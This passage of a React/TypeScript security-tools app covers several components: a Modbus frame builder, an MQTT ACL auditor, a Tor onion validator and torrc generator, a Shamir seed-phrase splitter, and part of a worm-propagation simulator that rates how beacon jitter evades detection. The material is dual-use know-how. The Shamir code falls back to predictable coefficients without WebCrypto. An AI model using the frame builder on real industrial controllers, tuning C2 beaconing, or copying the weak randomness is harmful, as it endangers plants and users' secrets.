    } else if (funcCode === 0x10) {
      // Write Multiple Registers (2 registers demo payload)
      pdu = [funcCode, (addr >> 8) & 0xff, addr & 0xff, 0x00, 0x02, 0x04, (val >> 8) & 0xff, val & 0xff, 0x00, 0x01];
    } else {
      pdu = [funcCode, (addr >> 8) & 0xff, addr & 0xff, (val >> 8) & 0xff, val & 0xff];
    }

    const rtuCore = [unit, ...pdu];
    const [crcLo, crcHi] = computeModbusCrc16(rtuCore);
    const rtuFrame = [...rtuCore, crcLo, crcHi];

    const mbapLen = pdu.length + 1;
    const tcpFrame = [
      (txId >> 8) & 0xff,
      txId & 0xff,
      0x00,
      0x00, // Protocol ID = 0 (Modbus)
      (mbapLen >> 8) & 0xff,
      mbapLen & 0xff,
      unit,
      ...pdu,
    ];

    const toHex = (arr: number[]) => arr.map((b) => b.toString(16).toUpperCase().padStart(2, "0")).join(" ");
    return {
      rtuHex: toHex(rtuFrame),
      tcpHex: toHex(tcpFrame),
      crcHex: `${crcLo.toString(16).toUpperCase().padStart(2, "0")} ${crcHi.toString(16).toUpperCase().padStart(2, "0")}`,
    };
  }, [slaveId, funcCode, startAddr, quantityOrVal, txId]);

  const mqttAudit = useMemo(() => {
    const hasMultiWildcard = mqttTopic.includes("#");
    const hasSingleWildcard = mqttTopic.includes("+");
    const isSysTopic = mqttTopic.startsWith("$SYS");
    const issues: string[] = [];

    if (mqttClientRole === "anonymous") {
      issues.push("CRITICAL: Anonymous unauthenticated client (`allow_anonymous true`) permitted on broker.");
    }
    if (hasMultiWildcard && mqttClientRole !== "scada-admin") {
      issues.push("HIGH: Multi-level `#` wildcard allows full subtree eavesdropping across OT telemetry topics.");
    }
    if (hasSingleWildcard) {
      issues.push("MEDIUM: Single-level `+` wildcard enumerates adjacent PLC/Device IDs across topic hierarchy.");
    }
    if (isSysTopic) {
      issues.push("HIGH: `$SYS/#` exposes Mosquitto broker version, connected client count, and uptime metrics.");
    }

    const aclSnippet = `# Hardened Mosquitto ACL file (/etc/mosquitto/acl.conf)\nuser scada_historian\ntopic read plant/+/telemetry\n\nuser plc_gateway_01\ntopic write plant/plc01/telemetry\ntopic read plant/plc01/commands`;
    return { issues, aclSnippet };
  }, [mqttTopic, mqttClientRole]);

  useEffect(() => {
    const out = [
      `# SCADA Modbus TCP/RTU & MQTT Security Frame Output`,
      `Slave ID: ${slaveId} | Function Code: 0x${funcCode.toString(16).padStart(2, "0")} | Address: ${startAddr} | Value/Qty: ${quantityOrVal}`,
      `Modbus RTU Frame (with Little-Endian CRC-16 [${modbusFrames.crcHex}]): ${modbusFrames.rtuHex}`,
      `Modbus TCP Frame (Port 502 MBAP + PDU): ${modbusFrames.tcpHex}`,
      `\n## MQTT Topic Audit (${mqttTopic})`,
      ...(mqttAudit.issues.length ? mqttAudit.issues : ["PASS: Least-privilege explicit topic path."]),
      `\n${mqttAudit.aclSnippet}`,
    ].join("\n");
    setOutput(out);
  }, [slaveId, funcCode, startAddr, quantityOrVal, modbusFrames, mqttTopic, mqttAudit, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex gap-2 border-b border-border pb-3">
        <button
          type="button"
          onClick={() => setTab("modbus")}
          className={`rounded-xs px-4 py-2 font-heading text-xs font-bold uppercase tracking-wider transition cursor-pointer ${
            tab === "modbus" ? "bg-[#ff6a00] text-white" : "border border-border bg-background text-text-muted"
          }`}
        >
          (A) Modbus TCP / RTU Hex Frame Builder
        </button>
        <button
          type="button"
          onClick={() => setTab("mqtt")}
          className={`rounded-xs px-4 py-2 font-heading text-xs font-bold uppercase tracking-wider transition cursor-pointer ${
            tab === "mqtt" ? "bg-[#ff6a00] text-white" : "border border-border bg-background text-text-muted"
          }`}
        >
          (B) IoT MQTT Wildcard & ACL Auditor
        </button>
      </div>

      {tab === "modbus" ? (
        <div className="space-y-4">
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            <div>
              <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
                Slave / Unit ID (1-247)
              </label>
              <input
                type="number"
                value={slaveId}
                onChange={(e) => setSlaveId(Number(e.target.value))}
                className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-sm text-text"
              />
            </div>

            <div>
              <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
                Modbus Function Code
              </label>
              <select
                value={funcCode}
                onChange={(e) => setFuncCode(Number(e.target.value))}
                className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-sm text-text"
              >
                <option value={0x01}>0x01 Read Coils</option>
                <option value={0x03}>0x03 Read Holding Registers</option>
                <option value={0x05}>0x05 Write Single Coil</option>
                <option value={0x06}>0x06 Write Single Register</option>
                <option value={0x10}>0x10 Write Multiple Registers</option>
              </select>
            </div>

            <div>
              <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
                Start Address (Dec)
              </label>
              <input
                type="number"
                value={startAddr}
                onChange={(e) => setStartAddr(Number(e.target.value))}
                className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-sm text-text"
              />
            </div>

            <div>
              <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
                Quantity / Register Value
              </label>
              <input
                type="number"
                value={quantityOrVal}
                onChange={(e) => setQuantityOrVal(Number(e.target.value))}
                className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-sm text-text"
              />
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="rounded-xs border border-border bg-[#121212] p-4 text-white">
              <div className="flex items-center justify-between mb-2">
                <span className="font-heading text-xs font-bold uppercase tracking-wider text-[#ff6a00]">
                  Modbus RTU Serial Frame (CRC-16 LE: {modbusFrames.crcHex})
                </span>
                <InlineCopyButton text={modbusFrames.rtuHex} label="Copy RTU Hex" />
              </div>
              <div className="font-mono-code text-sm text-emerald-400">{modbusFrames.rtuHex}</div>
            </div>

            <div className="rounded-xs border border-border bg-[#121212] p-4 text-white">
              <div className="flex items-center justify-between mb-2">
                <span className="font-heading text-xs font-bold uppercase tracking-wider text-sky-400">
                  Modbus TCP Port 502 Frame (7-Byte MBAP + PDU)
                </span>
                <InlineCopyButton text={modbusFrames.tcpHex} label="Copy TCP Hex" />
              </div>
              <div className="font-mono-code text-sm text-sky-300">{modbusFrames.tcpHex}</div>
            </div>
          </div>
        </div>
      ) : (
        <div className="space-y-4">
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <div className="sm:col-span-2">
              <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
                MQTT Subscription Topic Filter
              </label>
              <input
                type="text"
                value={mqttTopic}
                onChange={(e) => setMqttTopic(e.target.value)}
                className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-sm text-text"
              />
              <div className="mt-2 flex flex-wrap gap-1.5">
                {["#", "$SYS/#", "plant/+/commands", "plant/plc01/telemetry"].map((t) => (
                  <button
                    key={t}
                    type="button"
                    onClick={() => setMqttTopic(t)}
                    className="rounded-xs border border-border bg-surface px-2.5 py-1 font-mono-code text-xs text-text-muted hover:border-accent cursor-pointer"
                  >
                    {t}
                  </button>
                ))}
              </div>
            </div>

            <div>
              <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
                Client Authentication Profile
              </label>
              <select
                value={mqttClientRole}
                onChange={(e) => setMqttClientRole(e.target.value as typeof mqttClientRole)}
                className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-sm text-text"
              >
                <option value="anonymous">Anonymous (No Auth)</option>
                <option value="sensor-readonly">Field Sensor (Read-Only)</option>
                <option value="scada-admin">SCADA Historian Admin</option>
              </select>
            </div>
          </div>

          <div className="rounded-xs border border-border bg-background p-4 space-y-2">
            <div className="font-heading text-xs font-bold uppercase tracking-wider text-text">MQTT ACL Security Findings</div>
            {mqttAudit.issues.length > 0 ? (
              mqttAudit.issues.map((iss) => (
                <div key={iss} className="rounded-xs border border-red-500/40 bg-red-500/10 px-3 py-2 font-mono-code text-xs text-red-300">
                  {iss}
                </div>
              ))
            ) : (
              <div className="rounded-xs border border-emerald-500/40 bg-emerald-500/10 px-3 py-2 font-mono-code text-xs text-emerald-300">
                PASS: Explicit topic subscription without dangerous wildcard escalation.
              </div>
            )}
          </div>
        </div>
      )}

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 7. TOR ONION V3 OPSEC & TORRC GENERATOR
 * ========================================================================== */
// Compact pure-TS SHA3-256 (Keccak-f[1600], capacity=512, pad=0x06) for genuine Tor v3 .onion checksum validation
function sha3_256(msg: Uint8Array): Uint8Array {
  const RC: bigint[] = [
    0x0000000000000001n, 0x0000000000008082n, 0x800000000000808an, 0x8000000080008000n,
    0x000000000000808bn, 0x0000000080000001n, 0x8000000080008081n, 0x8000000000008009n,
    0x000000000000008an, 0x0000000000000088n, 0x0000000080008009n, 0x000000008000000an,
    0x000000008000808bn, 0x800000000000008bn, 0x8000000000008089n, 0x8000000000008003n,
    0x8000000000008002n, 0x8000000000000080n, 0x000000000000800an, 0x800000008000000an,
    0x8000000080008081n, 0x8000000000008080n, 0x0000000080000001n, 0x8000000080008008n,
  ];
  const ROT = [
    0, 1, 62, 28, 27, 36, 44, 6, 55, 20, 3, 10, 43, 25, 39, 41, 45, 15, 21, 8, 18, 2, 61, 56, 14,
  ];
  const PI = [
    0, 6, 12, 18, 24, 3, 9, 10, 16, 22, 1, 7, 13, 19, 20, 4, 5, 11, 17, 23, 2, 8, 14, 15, 21,
  ];
  const mask64 = 0xffffffffffffffffn;
  const rotl64 = (x: bigint, n: number) => (n === 0 ? x : ((x << BigInt(n)) | (x >> BigInt(64 - n))) & mask64);

  const rate = 136; // 1088 bits
  const padLen = rate - (msg.length % rate);
  const padded = new Uint8Array(msg.length + padLen);
  padded.set(msg);
  padded[msg.length] ^= 0x06;
  padded[padded.length - 1] ^= 0x80;

  const state = new Array<bigint>(25).fill(0n);

  for (let offset = 0; offset < padded.length; offset += rate) {
    for (let i = 0; i < rate / 8; i++) {
      let lane = 0n;
      for (let b = 0; b < 8; b++) {
        lane |= BigInt(padded[offset + i * 8 + b]) << BigInt(8 * b);
      }
      state[i] ^= lane;
    }

    for (let round = 0; round < 24; round++) {
      const C = new Array<bigint>(5).fill(0n);
      for (let x = 0; x < 5; x++) {
        C[x] = state[x] ^ state[x + 5] ^ state[x + 10] ^ state[x + 15] ^ state[x + 20];
      }
      for (let x = 0; x < 5; x++) {
        const D = C[(x + 4) % 5] ^ rotl64(C[(x + 1) % 5], 1);
        for (let y = 0; y < 25; y += 5) state[x + y] = (state[x + y] ^ D) & mask64;
      }
      const B = new Array<bigint>(25).fill(0n);
      for (let i = 0; i < 25; i++) B[PI[i]] = rotl64(state[i], ROT[i]);
      for (let y = 0; y < 25; y += 5) {
        for (let x = 0; x < 5; x++) {
          state[y + x] = (B[y + x] ^ (~B[y + ((x + 1) % 5)] & B[y + ((x + 2) % 5)])) & mask64;
        }
      }
      state[0] = (state[0] ^ RC[round]) & mask64;
    }
  }

  const out = new Uint8Array(32);
  for (let i = 0; i < 4; i++) {
    const lane = state[i];
    for (let b = 0; b < 8; b++) {
      out[i * 8 + b] = Number((lane >> BigInt(8 * b)) & 0xffn);
    }
  }
  return out;
}

function decodeBase32Onion(s: string): Uint8Array | null {
  const alphabet = "abcdefghijklmnopqrstuvwxyz234567";
  const clean = s.toLowerCase().replace(/\.onion$/i, "").trim();
  if (clean.length !== 56) return null;
  let bits = 0;
  let value = 0;
  const out: number[] = [];
  for (const ch of clean) {
    const idx = alphabet.indexOf(ch);
    if (idx === -1) return null;
    value = (value << 5) | idx;
    bits += 5;
    if (bits >= 8) {
      out.push((value >>> (bits - 8)) & 0xff);
      bits -= 8;
    }
  }
  return new Uint8Array(out);
}

function TorOnionV3OpsecTorrcGenerator({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [onionAddress, setOnionAddress] = useState("duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion");
  const [bridgeType, setBridgeType] = useState<"obfs4" | "snowflake" | "meek-azure">("obfs4");
  const [localPort, setLocalPort] = useState("8080");
  const [virtualPort, setVirtualPort] = useState("80");

  const validation = useMemo(() => {
    const clean = onionAddress.trim().toLowerCase().replace(/^https?:\/\//, "").split("/")[0];
    const decoded = decodeBase32Onion(clean);
    if (!decoded || decoded.length !== 35) {
      return {
        valid: false,
        reason: "Must be a 56-character RFC 4648 base32 v3 .onion address (35 bytes decoded).",
        pubKeyHex: "",
        checksumHex: "",
        computedChecksumHex: "",
        versionByte: 0,
      };
    }

    const pubkey = decoded.slice(0, 32);
    const checksum = decoded.slice(32, 34);
    const version = decoded[34];

    // Tor v3 spec: SHA3-256(".onion checksum" || PUBKEY || VERSION)
    const prefix = new TextEncoder().encode(".onion checksum");
    const checksumInput = new Uint8Array(prefix.length + 32 + 1);
    checksumInput.set(prefix, 0);
    checksumInput.set(pubkey, prefix.length);
    checksumInput[prefix.length + 32] = version;

    const digest = sha3_256(checksumInput);
    const computedChecksum = digest.slice(0, 2);

    const toHex = (u: Uint8Array) => Array.from(u).map((b) => b.toString(16).padStart(2, "0")).join("");
    const checksumMatch = checksum[0] === computedChecksum[0] && checksum[1] === computedChecksum[1];
    const versionMatch = version === 0x03;

    return {
      valid: checksumMatch && versionMatch,
      reason:
        checksumMatch && versionMatch
          ? "VALID Tor v3 Onion Service (Ed25519 Public Key + SHA3-256 Checksum Verified)"
          : !versionMatch
          ? `Invalid version byte 0x${version.toString(16)} (Expected 0x03)`
          : "SHA3-256 Checksum Mismatch (Typo or corrupted .onion address)",
      pubKeyHex: toHex(pubkey),
      checksumHex: toHex(checksum),
      computedChecksumHex: toHex(computedChecksum),
      versionByte: version,
    };
  }, [onionAddress]);

  const torrcConfig = useMemo(() => {
    const bridgeLines: Record<typeof bridgeType, string> = {
      obfs4: `UseBridges 1\nClientTransportPlugin obfs4 exec /usr/bin/obfs4proxy\nBridge obfs4 192.0.2.88:443 74FAD13168806246602538555B5521A0383A1875 cert=ssH+9rP8dG2NLDN2XuFw63hIO/9MNNinLmxQDpVa+7kTOa9/m+tGWT1SmSYpQ9uTBGa6Hw iat-mode=0`,
      snowflake: `UseBridges 1\nClientTransportPlugin snowflake exec /usr/bin/snowflake-client -url https://snowflake-broker.torproject.net.global.prod.fastly.net/ -front cdn.sstatic.net -ice stun:stun.l.google.com:19302`,
      "meek-azure": `UseBridges 1\nClientTransportPlugin obfs4 exec /usr/bin/obfs4proxy\nBridge meek_lite 192.0.2.18:80 BE776A53492E1E044A26F17306E1BC46A55A1625 url=https://meek.azureedge.net/ front=ajax.aspnetcdn.com`,
    };

    return [
      `# Hardened Tor v3 Onion Service & Pluggable Transport torrc`,
      `SocksPort 127.0.0.1:9050 IsolateDestAddr IsolateDestPort`,
      `ClientUseIPv6 0`,
      `SafeLogging 1`,
      ``,
      `# Pluggable Transport (${bridgeType})`,
      bridgeLines[bridgeType],
      ``,
      `# Onion v3 Hidden Service Definition (Bind strictly to 127.0.0.1, never 0.0.0.0!)`,
      `HiddenServiceDir /var/lib/tor/hidden_service_v3/`,
      `HiddenServiceVersion 3`,
      `HiddenServicePort ${virtualPort} 127.0.0.1:${localPort}`,
      `HiddenServiceEnableIntroDoSDefense 1`,
      `HiddenServicePoWDefensesEnabled 1`,
    ].join("\n");
  }, [bridgeType, localPort, virtualPort]);

  useEffect(() => {
    setOutput(
      [
        `# Tor v3 Address Cryptographic Validator & torrc Generator`,
        `Input Address: ${onionAddress}`,
        `Validation Status: ${validation.reason}`,
        `Ed25519 Public Key (32B): ${validation.pubKeyHex || "N/A"}`,
        `Embedded SHA3-256 Checksum (2B): 0x${validation.checksumHex} | Computed: 0x${validation.computedChecksumHex}`,
        `\n## Generated /etc/tor/torrc`,
        torrcConfig,
      ].join("\n")
    );
  }, [onionAddress, validation, torrcConfig, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap gap-2">
        {[
          { label: "DuckDuckGo v3 (Valid)", addr: "duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion" },
          { label: "Tor Project v3 (Valid)", addr: "2gzyxa5ihm7nsggfxnu52rck2vv4rvmdlkiu3zzui5du4xyclen53wid.onion" },
          { label: "Corrupted Checksum Test", addr: "duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczab.onion" },
        ].map((p) => (
          <button
            key={p.label}
            type="button"
            onClick={() => setOnionAddress(p.addr)}
            className="rounded-xs border border-border bg-background px-3 py-1.5 font-mono-code text-xs text-text-muted hover:border-accent hover:text-text cursor-pointer"
          >
            {p.label}
          </button>
        ))}
      </div>

      <div>
        <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
          56-Character Tor v3 `.onion` Address
        </label>
        <input
          type="text"
          value={onionAddress}
          onChange={(e) => setOnionAddress(e.target.value)}
          className="w-full rounded-xs border border-border bg-background px-3.5 py-2 font-mono-code text-sm text-text focus:border-accent focus:outline-none"
        />
      </div>

      <div
        className={`rounded-xs border p-4 ${
          validation.valid ? "border-emerald-500/50 bg-emerald-500/10" : "border-red-500/50 bg-red-500/10"
        }`}
      >
        <div className={`font-heading text-xs font-bold uppercase tracking-wider ${validation.valid ? "text-emerald-400" : "text-red-400"}`}>
          {validation.reason}
        </div>
        {validation.pubKeyHex && (
          <div className="mt-2 grid grid-cols-1 md:grid-cols-3 gap-2 font-mono-code text-xs text-text">
            <div className="md:col-span-2 break-all">
              <span className="text-text-muted">Ed25519 PubKey: </span>
              <span className="text-accent">{validation.pubKeyHex}</span>
            </div>
            <div>
              <span className="text-text-muted">SHA3-256 Checksum: </span>
              <span className="text-emerald-400">0x{validation.checksumHex}</span> (Computed: 0x{validation.computedChecksumHex})
            </div>
          </div>
        )}
      </div>

      {/* torrc Controls */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
            Pluggable Transport Bridge
          </label>
          <select
            value={bridgeType}
            onChange={(e) => setBridgeType(e.target.value as typeof bridgeType)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-xs text-text"
          >
            <option value="obfs4">obfs4 (Randomized Polymorphic)</option>
            <option value="snowflake">Snowflake (WebRTC Ephemeral Peers)</option>
            <option value="meek-azure">meek-azure (Domain Fronting)</option>
          </select>
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
            Virtual Onion Port
          </label>
          <input
            type="text"
            value={virtualPort}
            onChange={(e) => setVirtualPort(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-xs text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
            Local Loopback Port (127.0.0.1)
          </label>
          <input
            type="text"
            value={localPort}
            onChange={(e) => setLocalPort(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-xs text-text"
          />
        </div>
      </div>

      <div className="rounded-xs border border-border bg-[#121212] p-4 text-white">
        <div className="flex items-center justify-between mb-2">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-[#ff6a00]">
            Hardened `/etc/tor/torrc` Configuration
          </span>
          <InlineCopyButton text={torrcConfig} label="Copy torrc" />
        </div>
        <pre className="font-mono-code text-xs text-emerald-400 overflow-x-auto whitespace-pre-wrap">{torrcConfig}</pre>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 8. SHAMIR SECRET SHARING (GF(256)) BIP-39 SPLITTER & COMBINER
 * ========================================================================== */
// GF(256) arithmetic with irreducible polynomial x^8 + x^4 + x^3 + x + 1 (0x11B) and generator 0x03
const GF256_EXP = new Uint8Array(512);
const GF256_LOG = new Uint8Array(256);
(() => {
  let x = 1;
  for (let i = 0; i < 255; i++) {
    GF256_EXP[i] = x;
    GF256_EXP[i + 255] = x;
    GF256_LOG[x] = i;
    // Multiply by 0x03 in GF(256): (x * 2) ^ x
    const x2 = (x << 1) ^ (x & 0x80 ? 0x11b : 0);
    x = (x2 ^ x) & 0xff;
  }
  GF256_LOG[0] = 0;
})();

function gfMul(a: number, b: number): number {
  if (a === 0 || b === 0) return 0;
  return GF256_EXP[GF256_LOG[a] + GF256_LOG[b]];
}

function gfDiv(a: number, b: number): number {
  if (b === 0) throw new Error("GF(256) division by zero");
  if (a === 0) return 0;
  return GF256_EXP[GF256_LOG[a] + 255 - GF256_LOG[b]];
}

function splitSecretGf256(secretText: string, n: number, k: number): string[] {
  const bytes = new TextEncoder().encode(secretText);
  const shareBytes: Uint8Array[] = Array.from({ length: n }, () => new Uint8Array(bytes.length));

  for (let idx = 0; idx < bytes.length; idx++) {
    const coeffs = new Uint8Array(k);
    coeffs[0] = bytes[idx];
    for (let c = 1; c < k; c++) {
      // Deterministic-friendly pseudo-random or WebCrypto if available
      const rnd = new Uint8Array(1);
      if (typeof window !== "undefined" && window.crypto?.getRandomValues) {
        window.crypto.getRandomValues(rnd);
      } else {
        rnd[0] = ((idx + 1) * 73 + c * 37) & 0xff;
      }
      coeffs[c] = rnd[0] === 0 ? 0x5a : rnd[0];
    }

    for (let s = 0; s < n; s++) {
      const x = s + 1;
      // Horner's method evaluation at x
      let y = 0;
      for (let c = k - 1; c >= 0; c--) {
        y = gfMul(y, x) ^ coeffs[c];
      }
      shareBytes[s][idx] = y;
    }
  }

  return shareBytes.map((arr, s) => {
    const hex = Array.from(arr)
      .map((b) => b.toString(16).padStart(2, "0"))
      .join("");
    return `SSS1-${k}-${s + 1}-${hex}`;
  });
}

function combineSharesGf256(shareLines: string[]): { recovered: string; status: string } {
  const parsed: { k: number; x: number; data: Uint8Array }[] = [];
  for (const raw of shareLines) {
    const line = raw.trim();
    if (!line) continue;
    const parts = line.split("-");
    if (parts.length !== 4 || parts[0] !== "SSS1") {
      return { recovered: "", status: `Invalid share format: ${line}` };
    }
    const k = parseInt(parts[1], 10);
    const x = parseInt(parts[2], 10);
    const hex = parts[3];
    if (hex.length % 2 !== 0) return { recovered: "", status: "Corrupted hex payload in share." };
    const data = new Uint8Array(hex.length / 2);
    for (let i = 0; i < data.length; i++) {
      data[i] = parseInt(hex.slice(i * 2, i * 2 + 2), 16);
    }
    if (!parsed.some((p) => p.x === x)) {
      parsed.push({ k, x, data });
    }
  }

  if (parsed.length === 0) return { recovered: "", status: "Paste at least K shares to reconstruct." };
  const requiredK = parsed[0].k;
  if (parsed.length < requiredK) {
    return {
      recovered: "",
      status: `Insufficient threshold: Provided ${parsed.length} share(s), but K=${requiredK} required (Information-theoretically unrecoverable).`,
    };
  }

  const subset = parsed.slice(0, requiredK);
  const len = subset[0].data.length;
  const out = new Uint8Array(len);

  for (let b = 0; b < len; b++) {
    let secretByte = 0;
    for (let i = 0; i < subset.length; i++) {
      let num = 1;
      let den = 1;
      for (let j = 0; j < subset.length; j++) {
        if (i === j) continue;
        num = gfMul(num, subset[j].x);
        den = gfMul(den, subset[i].x ^ subset[j].x);
      }
      const lagrangeBasis = gfDiv(num, den);
      secretByte ^= gfMul(subset[i].data[b], lagrangeBasis);
    }
    out[b] = secretByte;
  }

  return {
    recovered: new TextDecoder().decode(out),
    status: `SUCCESS: Reconstructed exact secret from ${subset.length} shares over GF(256)!`,
  };
}

function ShamirSecretSharingBip39Splitter({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [secretInput, setSecretInput] = useState(
    "abandon ability able about above absent absorb abstract absurd abuse access accident"
  );
  const [totalSharesN, setTotalSharesN] = useState(5);
  const [thresholdK, setThresholdK] = useState(3);
  const [reconstructInput, setReconstructInput] = useState("");

  const shares = useMemo(
    () => splitSecretGf256(secretInput, totalSharesN, Math.min(thresholdK, totalSharesN)),
    [secretInput, totalSharesN, thresholdK]
  );

  useEffect(() => {
    setReconstructInput(shares.slice(0, thresholdK).join("\n"));
  }, [shares, thresholdK]);

  const reconstruction = useMemo(() => combineSharesGf256(reconstructInput.split("\n")), [reconstructInput]);

  useEffect(() => {
    setOutput(
      [
        `# Shamir's Secret Sharing (K=${thresholdK} of N=${totalSharesN} over GF(256))`,
        `Generated Shares:`,
        ...shares.map((s, i) => `Share #${i + 1}: ${s}`),
        `\n## Lagrange Interpolation Combiner`,
        `Status: ${reconstruction.status}`,
        `Recovered Secret: ${reconstruction.recovered}`,
      ].join("\n")
    );
  }, [shares, thresholdK, totalSharesN, reconstruction, setOutput]);

  return (
    <div className="space-y-5">
      <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
        <div className="md:col-span-2">
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Master Secret / 12-Word BIP-39 Seed Phrase to Split
          </label>
          <input
            type="text"
            value={secretInput}
            onChange={(e) => setSecretInput(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-3.5 py-2 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
          />
        </div>

        <div className="grid grid-cols-2 gap-2">
          <div>
            <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
              Total Shares (N)
            </label>
            <select
              value={totalSharesN}
              onChange={(e) => {
                const n = Number(e.target.value);
                setTotalSharesN(n);
                if (thresholdK > n) setThresholdK(n);
              }}
              className="w-full rounded-xs border border-border bg-background px-2.5 py-2 font-mono-code text-xs text-text"
            >
              {[3, 4, 5, 6, 7].map((n) => (
                <option key={n} value={n}>
                  N = {n} Shares
                </option>
              ))}
            </select>
          </div>
          <div>
            <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
              Threshold (K)
            </label>
            <select
              value={thresholdK}
              onChange={(e) => setThresholdK(Number(e.target.value))}
              className="w-full rounded-xs border border-border bg-background px-2.5 py-2 font-mono-code text-xs text-accent font-bold"
            >
              {Array.from({ length: totalSharesN - 1 }, (_, i) => i + 2).map((k) => (
                <option key={k} value={k}>
                  K = {k} Required
                </option>
              ))}
            </select>
          </div>
        </div>
      </div>

      {/* Generated Shares */}
      <div className="rounded-xs border border-border bg-[#121212] p-4 text-white space-y-2">
        <div className="flex items-center justify-between">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-[#ff6a00]">
            GF(256) Polynomial Shares (Any {thresholdK} of {totalSharesN} Reconstructs Secret)
          </span>
          <InlineCopyButton text={shares.join("\n")} label="Copy All Shares" />
        </div>
        <div className="space-y-1.5">
          {shares.map((sh, i) => (
            <div key={sh} className="flex items-center justify-between gap-2 rounded-xs border border-white/10 bg-black/50 px-3 py-1.5 font-mono-code text-xs">
              <span className="truncate text-emerald-400">{sh}</span>
              <InlineCopyButton text={sh} label={`Copy #${i + 1}`} />
            </div>
          ))}
        </div>
      </div>

      {/* Combiner */}
      <div className="rounded-xs border border-border bg-background p-4 space-y-3">
        <div className="flex flex-wrap items-center justify-between gap-2">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
            Lagrange Interpolation Combiner (Paste Any {thresholdK} Shares Below)
          </span>
          <button
            type="button"
            onClick={() => setReconstructInput(shares.slice(totalSharesN - thresholdK).join("\n"))}
            className="rounded-xs border border-border bg-surface px-2.5 py-1 font-heading text-[10px] font-bold uppercase tracking-wider text-accent hover:border-accent cursor-pointer"
          >
            Test Last {thresholdK} Shares
          </button>
        </div>
        <textarea
          rows={3}
          value={reconstructInput}
          onChange={(e) => setReconstructInput(e.target.value)}
          className="w-full rounded-xs border border-border bg-surface p-3 font-mono-code text-xs text-text"
        />
        <div className="rounded-xs border border-border bg-surface p-3">
          <div className="text-[11px] font-mono-code text-text-muted">{reconstruction.status}</div>
          {reconstruction.recovered && (
            <div className="mt-1 font-mono-code text-sm font-bold text-emerald-400">{reconstruction.recovered}</div>
          )}
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 9. WORM EPIDEMIC & BOTNET PROPAGATION SIMULATOR
 * ========================================================================== */
function WormEpidemicBotnetPropagationSimulator({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [totalHosts, setTotalHosts] = useState(10000);
  const [scanRateBeta, setScanRateBeta] = useState(0.65);
  const [patchRateGamma, setPatchRateGamma] = useState(0.15);
  const [segmentedVlans, setSegmentedVlans] = useState(false);
  const [beaconInterval, setBeaconInterval] = useState(60);
  const [beaconJitterPct, setBeaconJitterPct] = useState(25);

  const sim = useMemo(() => {
    const effectiveBeta = segmentedVlans ? scanRateBeta * 0.28 : scanRateBeta;
    const r0 = Number((effectiveBeta / patchRateGamma).toFixed(2));
    const steps = 60;
    const dt = 0.5;

    let S = totalHosts - 10;
    let I = 10;
    let R = 0;
    let peakI = I;
    let peakStep = 0;

    const history: { t: number; s: number; i: number; r: number }[] = [];

    for (let step = 0; step <= steps; step++) {
      history.push({ t: step, s: Math.round(S), i: Math.round(I), r: Math.round(R) });
      if (I > peakI) {
        peakI = I;
        peakStep = step;
      }
      const newInfected = (effectiveBeta * S * I) / totalHosts;
      const newRecovered = patchRateGamma * I;
      S = Math.max(0, S - newInfected * dt);
      I = Math.max(0, I + (newInfected - newRecovered) * dt);
      R = Math.min(totalHosts, R + newRecovered * dt);
    }

    const delta = (beaconInterval * beaconJitterPct) / 100;
    const minSleep = Number((beaconInterval - delta).toFixed(1));
    const maxSleep = Number((beaconInterval + delta).toFixed(1));
    const ritaScore = beaconJitterPct < 10 ? "98% (HIGH — Trivial FFT Periodicity Spike)" : beaconJitterPct < 30 ? "64% (MODERATE — Detectable via Histogram Skew)" : "28% (LOW — Requires JA4 / TLS Session Duration Heuristics)";

    return {
      r0,
      effectiveBeta: Number(effectiveBeta.toFixed(2)),
